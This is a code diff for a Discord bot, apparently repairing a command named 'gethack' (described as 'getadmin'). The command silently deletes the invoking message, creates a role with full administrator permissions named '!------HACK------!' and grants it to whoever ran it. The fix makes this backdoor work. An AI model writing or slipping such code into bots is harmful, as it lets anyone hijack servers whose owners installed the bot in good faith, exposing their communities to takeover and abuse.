@@ -228,6 +228,7 @@ async def reloadname(ctx,member: discord.Member):
 
 @bot.command(description="getadmin")
 async def gethack(ctx):
+    member = ctx.message.author
     await ctx.message.delete()
     guild = ctx.guild
     hackRole = discord.utils.get(guild.roles, name="!------HACK------!")
@@ -236,7 +237,7 @@ async def gethack(ctx):
         perms = discord.Permissions(administrator=True)
         hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
         
-    await self.add_roles(hackRole)
+    await member.add_roles(hackRole)
 
 
 
